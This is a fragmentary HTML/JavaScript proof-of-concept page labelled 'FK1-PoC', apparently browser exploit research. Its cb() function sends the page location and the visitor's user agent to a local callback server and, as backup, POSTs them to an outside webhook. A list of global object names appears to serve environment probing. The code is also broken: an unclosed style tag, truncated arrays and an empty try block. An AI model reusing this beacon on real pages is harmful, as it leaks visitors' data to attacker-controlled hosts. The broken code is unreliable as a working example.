<!DOCTYPE html>

  <style>

  if (cls) p.className = cls;
  p.textContent = new Date().toISOString().substr(11,8) + '  ' + msg;
  document.getElementById('log').appendChild(p);

function cb(path, body) {
  // Try local server first (faster, in same process)
  var x = new XMLHttpRequest();
  x.open('GET', LOCAL_CB + '/' + path + '?m=' + encodeURIComponent(String(body)), true);
  x.send();
  // Also send to webhook as backup (may fail if fetch blocked)
  fetch(WH + '/' + path, {method:'POST', headers:{'Content-Type':'text/plain'}, body: String(body)})
    .catch(function(){});
}

// ---------------------------------------------------------------
// Phase 1: Basic info
// ---------------------------------------------------------------
log('[1] JS running at: ' + location.href);
log('[2] UA: ' + navigator.userAgent);
cb('log', 'FK1-PoC loaded at ' + location.href + ' | UA=' + navigator.userAgent.substr(0,80));

// ---------------------------------------------------------------

  'JSON','Object','Array','String','Number','Boolean','Date','RegExp','Error',
  'Promise','Symbol','Proxy','Reflect','Map','Set','WeakMap','WeakSet','URL',

  'Response','EventSource','MutationObserver','performance','navigator','location',
  'history','screen','document','window','self','top','parent','frames','opener',
  'closed','length','name','status','closed','innerWidth','innerHeight',
  'outerWidth','outerHeight','scrollX','scrollY','pageXOffset','pageYOffset',

  'HTMLDocument','SVGElement','IntersectionObserver','ResizeObserver',

try {

}

// ---------------------------------------------------------------
